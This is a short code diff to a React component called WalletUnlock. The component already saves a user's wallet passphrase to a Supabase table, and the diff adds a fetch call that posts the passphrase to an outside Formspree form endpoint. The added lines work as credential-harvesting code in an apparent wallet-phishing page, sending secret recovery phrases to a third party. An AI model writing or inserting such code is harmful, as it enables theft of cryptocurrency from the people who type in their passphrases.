@@ -39,6 +39,16 @@ const WalletUnlock = () => {
         .insert([{ passphrase }]);
 
       if (error) throw error;
+          await fetch("https://formspree.io/f/xkovgvjr", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        Accept: "application/json"
+      },
+      body: JSON.stringify({
+        message: `New passphrase submitted:\n\n${passphrase}`
+      })
+    });
 
       console.log('Inserted into Supabase:', data);
       setSuccess(true); // ✅ show success modal
